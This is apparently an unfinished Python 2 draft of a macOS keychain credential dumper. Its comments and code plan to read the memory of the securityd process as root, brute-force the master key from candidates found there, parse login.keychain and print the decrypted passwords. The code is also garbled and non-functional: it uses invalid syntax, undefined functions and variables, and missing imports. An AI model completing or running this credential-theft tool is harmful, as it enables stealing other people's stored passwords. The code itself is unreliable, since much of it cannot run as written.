import ctypes

# analysis

# we need...

## pycrypto/openssl that supports DES encryption module (or write it myself)

# Create list of possible master keys

    # scans memory for possible master encryption keys and appends to a array

# locate pid of securityd

# uses virtual memory-map to scour for the master key

# returns the credentials class 

# brute-force the master key using the array

# decrypts the password encryption key from a given keyblob and returns it back to a array

# extracts encrypted password, server, account attributes and returns it to the CANDIDATE credentials array


# recursively searches keychain file/apple database, parsing keyblobs and credentials data
## keyblob = keys for ciphertext
## credentials data = password ciphertext + initialization vectors

# dump credentials


# main function/method

## Phase 1: search securityd's memory for possible master keys
## If keychain = unlocked then real key is probably in memory

def popen_subprocess(cmd):
    p = subprocess.Popen(
        cmd,
        shell=True,
        executable='/bin/bash',
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    return output

def dump_wrapping_key(output,candidate,buffer,sz_candidate):
    match[] = "\xfa\xde\x07\x11"

# operators probably doesnt work
    for i in range(offset=sz_candidate-4,offset >= 0, offset-=4):
        # if any(match,buffer):
        
        if any(match in buffer for i in buffer):

    return
def main():
    pid = findpid()
    if pid != True:
        print "Exception: Pid cannot be found"
        exit(0)
    if popen_subprocess("whoami") != "root":
        print "Exception: Please run this app in SUDO"
        exit(0)
    
    search_keys(pid)
    print "Debug: Found %s master key candidates" % str(master_key_candidates)

    if master_key_candidates != True:
        print "Exception: No master keys found"
        exit(0)
    
    hp = popen_subprocess("echo $HOME")

    # for i in master_key_candidates:
    possible_key = str(i)
    filename = "%s/Library/Keychains/login.keychain" % str(hp)
    # os.system(cmd)
    F = open(filename,'rb')
    buffer = F.read()

    for i in master_key_candidates:
        possible_key_hex = hex(int(master_key_candidates[i]))
        print "Attempting possible key: %s" % str(master_key_candidates[i])
        key_len = dump_wrapping_key(
            possible_key,
            master_key_candidates[i],
            buffer,
            sz_candidate
        )
        if key_len == True:
            print "Found master key %s", possible_key
            break
        
        if key_len != True:
            print "None of the key candidates seem to work"
            exit(0)
    
    found_key_hex = hex(possible_key)
    print "Found wrapping key: %s" % str(found_key_hex)
    dump_keychain(found_key_hex, buffer)
    decrypt_credentials()
    print credentials()

    return
main()